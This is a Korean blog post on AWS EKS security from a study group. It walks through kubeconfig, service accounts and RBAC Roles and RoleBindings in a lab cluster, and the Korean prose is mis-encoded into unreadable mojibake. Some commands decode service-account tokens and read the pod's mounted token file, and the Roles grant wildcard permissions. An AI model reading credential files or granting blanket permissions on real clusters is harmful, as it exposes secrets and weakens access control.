<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="apple-icon-180x180" sizes="180x180" href='/img/favicon/apple-icon-180x180.png'>
    <link rel="icon" type="image/png" sizes="32x32" href='/img/favicon/favicon-32x32.png'>
    <link rel="icon" type="image/png" sizes="16x16" href='/img/favicon/favicon-16x16.png'>
    <title>AWS EKS ìŠ¤í„°ë”” 6ì£¼ì°¨ - Security | kkumtree</title>
    
    <meta property="og:site_name" content="kkumtree" />
    <meta property="og:title" content="AWS EKS ìŠ¤í„°ë”” 6ì£¼ì°¨ - Security" />

    
    <meta property="og:image" content='https://blog.minseong.xyz/post/aws-eks-study-week6/cover.jpg' />
    <meta property="og:image:secure_url" content='https://blog.minseong.xyz/post/aws-eks-study-week6/cover.jpg' />
    
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:image" content='https://blog.minseong.xyz/post/aws-eks-study-week6/cover.jpg' />

    
    <link rel="stylesheet" href="https://blog.minseong.xyz/sass/theme.min.05bc9a89b9988ba7449154a7ccd83133b7df79fac13cc1945cffac151ac54dbb.css">
</head>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-GCJ1CESNKD"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-GCJ1CESNKD');
</script><body><header id="navigation" class="p-navigation is-dark">
  <div class="p-navigation__row">
    <div class="p-navigation__banner">
      <div class="p-navigation__tagged-logo" style="min-width: 6rem;">
        <a class="p-navigation__link" href="/">
          <div class="p-navigation__logo-tag">
            <img class="p-navigation__logo-icon" src="/img/BlogWhite.svg" alt="">
          </div>
          <span class="p-navigation__logo-title">Blog</span>
        </a>
      </div>
      <a href="#navigation" class="p-navigation__toggle--open" title="menu">Menu</a>
      <a href="#navigation-closed" class="p-navigation__toggle--close" title="close menu">Close menu</a>
    </div>
    <nav class="p-navigation__nav" aria-label="Example sub navigation">
      <ul class="p-navigation__items">
        
      </ul>
     
     <ul class="p-navigation__items">
        <li class="p-navigation__item--dropdown-toggle" id="link-4">
          <a class="p-navigation__link" aria-controls="account-menu">
            ğŸŒ
          </a>
          <ul class="p-navigation__dropdown--right" id="account-menu" aria-hidden="true">
            
            
            
          </ul>
        </li>
        <li class="p-navigation__item--dropdown-toggle" id="link-4">
          <a class="p-navigation__link" aria-controls="account-menu">
            ğŸ”—
          </a>
          <ul class="p-navigation__dropdown--right" id="account-menu" aria-hidden="true">
            
          </ul>
        </li>
      </ul>
    </nav>
  </div>
</header>
<div id="content">


<main>
  <section class="p-strip--image main-strip"
    }
    style="background-image:url('cover.jpg'); background-position: center; background-repeat: no-repeat; background-size: cover;"
    >
      <div class="row">
        
        <div class="col-6">
          <div class="p-card--overlay">
            <h2>AWS EKS ìŠ¤í„°ë”” 6ì£¼ì°¨ - Security</h2>
            <ul class="p-card__content p-inline-list--middot">
              
              <li class="p-inline-list__item">
                kkumtree
              </li>
              
            </ul>
            <p><u class=" timedisplay" style="text-decoration-style: dotted;">2023-06-04T06:56:52&#43;09:00</u></p>
            <p class="p-card__content"></p>
            
            <a href="/tags/aws" class="tag">
              <div class="p-chip">
                <span class="p-chip__value">AWS</span>
              </div>
            </a>
            
            <a href="/tags/eks" class="tag">
              <div class="p-chip">
                <span class="p-chip__value">EKS</span>
              </div>
            </a>
            
            <a href="/tags/cloudnet@" class="tag">
              <div class="p-chip">
                <span class="p-chip__value">CloudNet@</span>
              </div>
            </a>
            
            <a href="/tags/security" class="tag">
              <div class="p-chip">
                <span class="p-chip__value">security</span>
              </div>
            </a>
            
            <a href="/tags/irsa" class="tag">
              <div class="p-chip">
                <span class="p-chip__value">IRSA</span>
              </div>
            </a>
            
          </div>
        </div>
        
      </div>
  </section>
  <section class="p-strip">
  <div class="row">
  <p>ì´ë²ˆì—ëŠ” ë³´ì•ˆì„ ìœ„í•œ ì¸ì¦ ë° ì¸ê°€, ê·¸ë¦¬ê³  IRSAë¥¼ ì¤‘ì‹¬ìœ¼ë¡œ EKSì˜ ë³´ì•ˆì— ëŒ€í•´ í•™ìŠµí•´ë³´ì•˜ìŠµë‹ˆë‹¤.</p>
<p>kops ìŠ¤í„°ë”” ë•Œì—ëŠ” ì˜ ëª°ëëŠ”ë°, RBAC ë¿ë§Œ ì•„ë‹ˆë¼ ë³µê¸°í•˜ë‹¤ë³´ë‹ˆ&hellip;</p>
<ul>
<li>[4-1] pro<strong>j</strong>ected Volume</li>
<li>[4-2] AWS Load Balancer Controller IRSA ë° LB Pod mutating</li>
</ul>
<p>ìœ„ì˜ ë‘ ê°€ì§€ê°€ ì¤‘ìš”í•œ íŒŒíŠ¸ë¥¼ ì°¨ì§€í•˜ê³  ìˆì—ˆìŒì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.<br>
Network(2ì£¼ì°¨)ê°€ ë§¤ë²ˆ ë­”ê°€ ì¼ë¶€ê°€ ì•„ë¦¬ì†¡í•˜ì˜€ë‹¤ë©´<br>
SecurityëŠ” ë³µê¸°í•˜ë‹¤ê°€ ì´ë¡ ì ìœ¼ë¡œëŠ” ê°„ë‹¨(ê³¼ì—°?)í•´ë³´ì—¬ë„<br>
ì‹¤ì œ êµ¬ë™ë°©ì‹ ì´í•´ ìì²´ê°€ ì´ˆë°˜ì— ì•ˆë˜ì„œ, ì‚¬í˜ ë‚¨ì§“ ê±¸ë¦° ë•ì— ë” ì–´ë ¤ì› ë˜ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p>
<h2 id="ê·¸-ì™¸">ê·¸ ì™¸</h2>
<ol>
<li>myeks-bastion-2ì— ì ‘ì† ì‹œ, í•¨ê»˜ ì§„í–‰í•  ë•ŒëŠ” <code>ssh {Public IP}</code>ë¡œ ì˜ ì ‘ì†ë˜ëŠ” ê±¸ ë´¤ëŠ”ë° ì •ì‘ í˜¼ì í•  ë• ì ‘ì†ì´ ë˜ì§€ì•Šì•˜ìŠµë‹ˆë‹¤.
<ul>
<li>Amazon Linuxì—ì„œëŠ” ssh ec2-user@{Public IP}ë¡œ ì ‘ì†í•´ì•¼í•¨<br>
(í•„ìš”í•œ ê²½ìš° sshí‚¤ë„ í¬í•¨)</li>
<li>AWS Public AMIì—ì„œ ì œê³µë˜ëŠ” Ubuntu AMIì˜ ê²½ìš°,<br>
ubuntu@{Public IP}ë¡œ ì ‘ì†ê°€ëŠ¥</li>
<li>ì¶”ì •: ê³µìœ ëœ ë¨¸ì‹ ì— ë‹¤ë¥¸ ì„¤ì •ì´ ì´ìŠˆê°€ ë˜ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì •ë©ë‹ˆë‹¤.
<img src="./images/ssh-failure-1.png" alt="ssh failure 1">
<img src="./images/ssh-failure-2.png" alt="ssh failure 2"></li>
</ul>
</li>
<li>IAM User(testuser)ëŠ” ì›¹ì½˜ì†”ì—ì„œ ì‚­ì œí•˜ëŠ” ê²ƒì´ í¸ë¦¬í•©ë‹ˆë‹¤.
<ul>
<li>ì•„ë‹ˆë©´, ì•„ë˜ì²˜ëŸ¼ detach í•œë‹¤ëŠ” ëŠë‚Œìœ¼ë¡œ ìˆœì°¨ì  ì‹¤í–‰í•©ë‹ˆë‹¤.
<ul>
<li>list-attached-role-policies &amp;&amp; detach-role-policy</li>
<li>list-access-keys &amp;&amp; delete-access-key</li>
<li>delete-user
<img src="./images/delete-user-with-cli.png" alt="delete user with cli"></li>
</ul>
</li>
</ul>
</li>
<li>CLIë¡œ IAM Trust Relationship ì¡°íšŒ
<ul>
<li>ì›¹ ì½˜ì†”ì— êµ³ì´ ë“¤ì–´ê°€ì•¼í•˜ë‚˜ í•˜ê³ , ë¬¸ë“ í˜¸ê¸°ì‹¬ì— ì‹œë„í•˜ë‹¤ê°€ ì‹œê°„ì´ ë‚ ì•„ê°”ìŠµë‹ˆë‹¤.</li>
<li>ê²°ë¡ : í•˜ë“œì½”ì–´í•œ íŒŒì‹±..
<ul>
<li><code>jq -r '.[].status.roleARN' | rev | cut -d '/' -f1 | rev</code></li>
<li>chatGPTì—ê²Œ ì•„ë˜ì™€ ê°™ì´ êµì • ë°›ì•˜ì§€ë§Œ, íƒíƒì¹˜ ì•ŠìŒ..<br>
<code>jq -r '.[].status.roleARN' | grep -oE '[^/]+$'</code><br>
<img src="./images/iam-trust-relationship-with-cli.png" alt="iam trust relationship with cli"></li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="1-ì‹¤ìŠµ-í™˜ê²½-ë°°í¬">1. ì‹¤ìŠµ í™˜ê²½ ë°°í¬</h2>
<ul>
<li>ëª¨ì˜ê³µê²©(?) í…ŒìŠ¤íŠ¸ë¥¼ ìœ„í•´ 2ê°œì˜ bastion ì„œë²„ê°€ êµ¬ì„±ëœ í™˜ê²½ ë°°í¬</li>
<li>p8s ë° grafanaì˜ ê²½ìš°, ì„ íƒì ìœ¼ë¡œ ë°°í¬í•´ë„ ë˜ì„œ ê¸°ìˆ  ìƒëµ</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick5.yaml
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì´í•˜ ì¤‘ëµ</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># CERT_ARN(ACM)ì˜ ê²½ìš°ì—ëŠ” /etc/profileì— í™˜ê²½ë³€ìˆ˜ ì €ì¥ì„ ì•ˆí•´ë‘¬ì„œ  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì„¸ì…˜ì´ ë§Œë£Œë˜ë©´, ë‹¤ì‹œ ì¬ì„¤ì • í•„ìš”</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CERT_ARN<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>aws acm list-certificates --query <span style="color:#e6db74">&#39;CertificateSummaryList[].CertificateArn[]&#39;</span> --output text<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>echo $CERT_ARN
</span></span></code></pre></div><h2 id="2-k8s-ì¸ì¦ì¸ê°€">2. k8s ì¸ì¦/ì¸ê°€</h2>
<ul>
<li><code>.kube/config</code> íŒŒì¼ì„ ê¸°ë°˜
<ul>
<li>cluster: k8s API ì„œë²„ ì ‘ì†ì •ë³´</li>
<li>users: API ì„œë²„ì— ì ‘ì†í•˜ê¸° ìœ„í•œ ìœ ì € ì¸ì¦ì •ë³´ ëª©ë¡</li>
<li>contexts: clusterë° userë¥¼ ë§¤í•‘(ì¡°í•©)í•œ ì •ë³´</li>
</ul>
</li>
</ul>
<p><img src="./images/kubeconfig.png" alt="kubeconfig"></p>
<h3 id="2-1-ì¸ì¦ì¸ê°€-ì‹¤ìŠµ">2-1. ì¸ì¦/ì¸ê°€ ì‹¤ìŠµ</h3>
<ul>
<li>ì—¬ê¸°ì„œëŠ” ì¸í”„ë¼íŒ€, ê°œë°œíŒ€ìœ¼ë¡œ ê°ê°ì˜ nsì— ìœ ì €ë¥¼ ìƒì„±í•˜ì—¬ ì‹¤ìŠµ</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl create namespace dev-team
</span></span><span style="display:flex;"><span>kubectl create ns infra-team
</span></span><span style="display:flex;"><span>kubectl get ns
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ì„œë¹„ìŠ¤ ì–´ì¹´ìš´íŠ¸ ìƒì„±</span>
</span></span><span style="display:flex;"><span>kubectl create sa dev-k8s -n dev-team
</span></span><span style="display:flex;"><span>kubectl create sa infra-k8s -n infra-team
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì„œë¹„ìŠ¤ ì–´ì¹´ìš´íŠ¸ ì •ë³´ í™•ì¸</span>
</span></span><span style="display:flex;"><span>kubectl get sa -n dev-team
</span></span><span style="display:flex;"><span>kubectl get sa dev-k8s -n dev-team -o yaml | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl get sa -n infra-team
</span></span><span style="display:flex;"><span>kubectl get sa infra-k8s -n infra-team -o yaml | yh
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># dev-k8s ì„œë¹„ìŠ¤ ì–´ì¹´ìš´íŠ¸ì˜ í† í° íšë“</span>
</span></span><span style="display:flex;"><span>DevTokenName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get sa dev-k8s -n dev-team -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{.secrets[0].name}&#34;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>DevToken<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get secret -n dev-team $DevTokenName -o jsonpath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{.data.token}&#34;</span> | base64 -d<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>echo $DevToken
</span></span></code></pre></div><p><img src="./images/service-account.png" alt="service account"></p>
<ul>
<li>ê°ê°ì˜ YAMLíŒŒì¼ì— í† í°ì´ ìˆëŠ”ë° ì´ëŠ” JWT(Bearer)í† í°ìœ¼ë¡œ ì•„ë˜ì—ì„œ í™•ì¸ê°€ëŠ¥
<ul>
<li><a href="https://jwt.io/">https://jwt.io/</a></li>
<li>ê²½ìš°ì— ë”°ë¼, Credentialë„ ìˆê¸° ë•Œë¬¸ì— ì·¨ê¸‰ì£¼ì˜</li>
</ul>
</li>
</ul>
<p><img src="./images/jwt.png" alt="jwt"></p>
<ul>
<li>SA ì§€ì •í•˜ì—¬ íŒŒë“œ ìƒì„± í›„ ê¶Œí•œ í…ŒìŠ¤íŠ¸</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dev-kubectl
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  serviceAccountName: dev-k8s
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: kubectl-pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: bitnami/kubectl:1.24.10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;tail&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    args: [&#34;-f&#34;, &#34;/dev/null&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  terminationGracePeriodSeconds: 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: infra-kubectl
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  serviceAccountName: infra-k8s
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  - name: kubectl-pod
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    image: bitnami/kubectl:1.24.10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    command: [&#34;tail&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    args: [&#34;-f&#34;, &#34;/dev/null&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  terminationGracePeriodSeconds: 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># í™•ì¸</span>
</span></span><span style="display:flex;"><span>kubectl get pod -o dev-kubectl -n dev-team -o yaml | grep serviceAccount
</span></span><span style="display:flex;"><span>kubectl get pod -o infra-kubectl -n infra-team -o yaml | grep serviceAccount
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># íŒŒë“œì— ê¸°ë³¸ ì ìš©ë˜ëŠ” SA ì •ë³´(í† í°) </span>
</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- ls /run/secrets/kubernetes.io/serviceaccount
</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/token
</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/namespace
</span></span><span style="display:flex;"><span>kubectl exec -it dev-kubectl -n dev-team -- cat /run/secrets/kubernetes.io/serviceaccount/ca.crt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ê° íŒŒë“œ ì ‘ì†í•˜ì—¬, ì •ë³´ í™•ì¸ with alias</span>
</span></span><span style="display:flex;"><span>alias k1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it dev-kubectl -n dev-team -- kubectl&#39;</span>
</span></span><span style="display:flex;"><span>alias k2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it infra-kubectl -n infra-team -- kubectl&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ê¶Œí•œ í…ŒìŠ¤íŠ¸</span>
</span></span><span style="display:flex;"><span>k1 get pods <span style="color:#75715e"># kubectl exec -it dev-kubectl -n dev-team -- kubectl get pods ì™€ ë™ì¼í•œ ì‹¤í–‰ ëª…ë ¹ì´ë‹¤!</span>
</span></span><span style="display:flex;"><span>k1 run nginx --image nginx:1.20-alpine
</span></span><span style="display:flex;"><span>k1 get pods -n kube-system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (ì˜µì…˜) kubectl ì‹¤í–‰ ì‚¬ìš©ì(host ê¸°ì¤€)ê°€ íŠ¹ì • ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸ [ê²°ê³¼: no]</span>
</span></span><span style="display:flex;"><span>k1 auth can-i get pods
</span></span></code></pre></div><p><img src="./images/test-pod-creation-for-sa.png" alt="test pod creation for sa"></p>
<p><img src="./images/sa-failure-without-rolebinding.png" alt="sa failure without RoleBinding"></p>
<ul>
<li>ë‹¹ì—°íˆ ë˜ì§€ ì•ŠìŒ. ë‹¨ì§€ SAë¥¼ ë§Œë“¤ì–´ì„œ íŒŒë“œì— ì ì–´ë„£ì—ˆì„ ë¿
<ol>
<li>Roleì˜ ë¶€ì¬</li>
<li>SAì™€ Roleì˜ ë§¤í•‘(RoleBinding)ì˜ ë¶€ì¬</li>
</ol>
</li>
<li>ì•„ë˜ì—ì„œ ìœ„ì˜ ë‘ ê°€ì§€ë¥¼ ìƒì„±</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ê° NSì— Role ìƒì„± í›„ í™•ì¸</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Role
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rules:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- apiGroups: [&#34;*&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  resources: [&#34;*&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  verbs: [&#34;*&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Role
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">rules:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- apiGroups: [&#34;*&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  resources: [&#34;*&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  verbs: [&#34;*&#34;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl describe roles role-dev-team -n dev-team
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ê° NSì— SAì™€ Role ë§¤í•‘(RoleBinding) ìƒì„± í›„ í™•ì¸</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: RoleBinding
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: roleB-dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">roleRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  apiGroup: rbac.authorization.k8s.io
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  kind: Role
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">subjects:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- kind: ServiceAccount
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dev-k8s
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: dev-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl create -f -
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: rbac.authorization.k8s.io/v1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: RoleBinding
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: roleB-infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">roleRef:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  apiGroup: rbac.authorization.k8s.io
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  kind: Role
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: role-infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">subjects:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- kind: ServiceAccount
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: infra-k8s
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  namespace: infra-team
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>kubectl describe rolebindings roleB-dev-team -n dev-team
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ê¶Œí•œ í…ŒìŠ¤íŠ¸ ì„±ê³µ</span>
</span></span><span style="display:flex;"><span>alias k1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it dev-kubectl -n dev-team -- kubectl&#39;</span>
</span></span><span style="display:flex;"><span>alias k2<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;kubectl exec -it infra-kubectl -n infra-team -- kubectl&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>k1 get pods 
</span></span><span style="display:flex;"><span>k1 run nginx --image nginx:1.20-alpine
</span></span><span style="display:flex;"><span>k1 get pods
</span></span><span style="display:flex;"><span>k1 delete pods nginx
</span></span><span style="display:flex;"><span>k1 get pods -n kube-system
</span></span><span style="display:flex;"><span>k1 get nodes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>k1 auth can-i get pods <span style="color:#75715e"># yes</span>
</span></span></code></pre></div><p><img src="./images/creation-role-for-sa.png" alt="creation role for sa"></p>
<p><img src="./images/sa-success-with-rolebinding.png" alt="sa success with RoleBinding"></p>
<h2 id="3-eks-ì¸ì¦ì¸ê°€">3. EKS ì¸ì¦/ì¸ê°€</h2>
<ul>
<li>ì•ì—ì„œ k8s ì¸ì¦/ì¸ê°€ë¥¼ í–ˆë‹¤ë©´ ì´ì œëŠ” AWS IAM ì„œë¹„ìŠ¤ì™€ ê²°í•©
<ul>
<li>ì¸ì¦: AWS IAM</li>
<li>ì¸ê°€: k8s RBAC</li>
</ul>
</li>
<li>ì›í™œí•œ ì§„í–‰ì„ ìœ„í•´ RBACìš© krew í”ŒëŸ¬ê·¸ì¸ ì„¤ì¹˜</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl krew install access-matrix rbac-tool rbac-view rolesum
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ì‹¤ìŠµ NSì¸ defaultì—ì„œ ì•¡ì„¸ìŠ¤ ë§¤íŠ¸ë¦­ìŠ¤ </span>
</span></span><span style="display:flex;"><span>kubectl access-matrix --namespace default
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># USER/GROUP/SA ë‹¨ìœ„ì˜ RBAC ì¡°íšŒ</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:nodes == eks:node-bootstrapper</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># system:bootstrappers == eks:node-bootstrapper</span>
</span></span><span style="display:flex;"><span>kubectl rbac-tool lookup system:masters
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># USER/GROUP/SA ë‹¨ìœ„ì˜ RBAC ì •ì±… ê·œì¹™ </span>
</span></span><span style="display:flex;"><span>kubectl rbac-tool policy-rules
</span></span><span style="display:flex;"><span>kubectl rbac-tool policy-rules
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># í•´ë‹¹ í´ëŸ¬ìŠ¤í„°ì—ì„œ ì‚¬ìš© ê°€ëŠ¥í•œ í´ëŸ¬ìŠ¤í„°ë¡¤ ì¡°íšŒ</span>
</span></span><span style="display:flex;"><span>kubectl rbac-tool show
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># í´ëŸ¬ìŠ¤í„°ì— ì¸ì¦ëœ í˜„ì¬ ì»¨í…ìŠ¤íŠ¸ì˜ ì‚¬ìš©ì </span>
</span></span><span style="display:flex;"><span>kubectl rbac-tool whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># USER/GROUP/SA ë‹¨ìœ„ì˜ RBAC ì—­í•  ì¡°íšŒ</span>
</span></span><span style="display:flex;"><span>kubectl rolesum aws-node -n kube-system
</span></span><span style="display:flex;"><span>kubectl rolesum -k User system:kube-proxy
</span></span><span style="display:flex;"><span>kubectl rolesum -k Group system:masters
</span></span><span style="display:flex;"><span>
